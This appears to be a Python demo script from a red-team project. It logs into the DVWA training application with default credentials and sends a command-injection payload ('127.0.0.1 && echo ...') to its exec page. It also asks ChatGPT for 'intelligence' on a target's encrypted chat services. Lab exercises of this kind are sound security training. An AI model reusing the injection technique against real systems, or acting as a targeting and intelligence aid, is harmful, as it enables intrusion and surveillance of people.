import requests
import sys
import os
current_dir = os.path.dirname(os.path.abspath(__file__))
class_dir = os.path.join(current_dir, "..", "class")
sys.path.append(class_dir)
from dvwa_session import DVWA_Session
from chatgpt_func import ChatGPT_Func
from general_func import General_Func

class PointlessAI_custom_search_capabilities(DVWA_Session, ChatGPT_Func, General_Func):
    def __init__(self):
        DVWA_Session.__init__(self)
        ChatGPT_Func.__init__(self)
        General_Func.__init__(self)

    def custom_search_with_chatgpt(self, search_query, guidance):
        """
        Utilizes ChatGPT to perform advanced custom searches, filtering through data and employing natural language 
        queries to find targeted information.
        """
        response = self.red_team_query(search_query, guidance)
        return response

    def custom_search_in_dvwa(self, s, search_term, cookie):
        """
        Demonstrates conducting a custom search capability within DVWA.
        The search_term parameter should be engineered based on intelligence gathering objectives.
        """
        search_url = f"{self.base_url}/vulnerabilities/exec/"
        data = {
            "ip": search_term,  # Pretend the search term is an IP for injection demo
            "Submit": "Submit"
        }
        headers = self.headers
        headers['Cookie'] = 'PHPSESSID=' + cookie['PHPSESSID'] + '; security=low'
        response = s.post(search_url, headers=headers, data=data)
        
        if "PREVIOUS SEARCH" in response.text:
            print(f"Custom search for '{search_term}' executed successfully in DVWA.")
        else:
            print(f"Failed to execute custom search for '{search_term}'.")

    def demonstrate_custom_search_capabilities(self):
        """
        Demonstrates utilizing advanced search techniques and ChatGPT queries to gather intelligence.
        """
        target_info = "encrypted chat services information on target"
        search_guidance = "Utilizes advanced search techniques to focus on relevant intelligence."

        print("Demonstrating Custom Search Capabilities with ChatGPT:")
        chatgpt_search_response = self.custom_search_with_chatgpt(target_info, search_guidance)
        print("ChatGPT Custom Search Output:", chatgpt_search_response)

        # Start session with DVWA
        with requests.Session() as s:
            user_token, cookies = self.get_csrf_token_and_cookie(s, self.get_constants())
            _ = self.login_to_dvwa(s, self.get_constants(), "admin", "password", user_token)
            self.custom_search_in_dvwa(s, "127.0.0.1 && echo 'Custom Search Executed';", cookies)

def main():
    ai = PointlessAI_custom_search_capabilities()
    ai.demonstrate_custom_search_capabilities()

if __name__ == "__main__":
    main()
